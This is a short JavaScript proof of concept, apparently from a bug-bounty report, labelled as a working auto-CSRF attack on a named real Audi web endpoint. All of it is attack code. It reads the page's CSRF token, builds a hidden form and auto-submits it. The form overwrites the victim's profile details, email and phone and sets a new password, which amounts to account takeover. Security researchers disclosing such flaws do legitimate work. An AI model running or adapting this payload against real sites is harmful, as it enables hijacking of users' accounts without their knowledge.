// WORKING AUTO-CSRF FOR osa2.audi.de
// Sends a REAL form POST (not fetch) so the backend accepts it.
(function() {

    // 1. Extract CSRF token from page
    const tokenInput = document.querySelector("input[name='CSRFToken']");
    if (!tokenInput) return;
    const token = tokenInput.value;

    // 2. Build a hidden form identical to the real one
    const f = document.createElement("form");
    f.method = "POST";
    f.action = "https://osa2.audi.de/ve/ns_content.jsp";

    // Helper to append fields
    function add(name, value) {
        const i = document.createElement("input");
        i.type = "hidden";
        i.name = name;
        i.value = value;
        f.appendChild(i);
    }

    // 3. Append all required fields
    add("dividerPos", "0");
    add("mouseX", "1065");
    add("mouseY", "280");
    add("focusElement", "userPasswordNew2");
    add("browser", "-422d1c48:19acb3cc742:-7da6$1");
    add("control", "43694");
    add("event", "click");
    add("eventValue", "");
    add("CSRFToken", token);   // ★ dynamic token
    add("submit", "Submit+Query");

    // attacker-controlled impact
    add("j_43697", "HACKED");
    add("j_43699", "IMPACT");
    add("j_43701", "XSS");
    add("j_43704", "MODIFIED");
    add("j_43708", "CSRF");
    add("j_43715", "domBreak");
    add("j_43717", "naysser@bugcrowdninja.com");
    add("j_43719", "+19999999999");

    // overwrite password to prove impact
    add("j_43734", "NewPass!2025");
    add("j_43736", "NewPass!2025");

    add("j_43739", "true");
    add("j_43747", "");
    add("j_43749", "0:0");
    add("j_43761", "");
    add("j_43688", "0");
    add("formScrollPos", "0");
    add("j_43685", "0");
    add("domainScrollPos", "0");
    add("j_43695", "Frau");

    // 4. Inject & auto-submit
    document.body.appendChild(f);
    f.submit();

})();
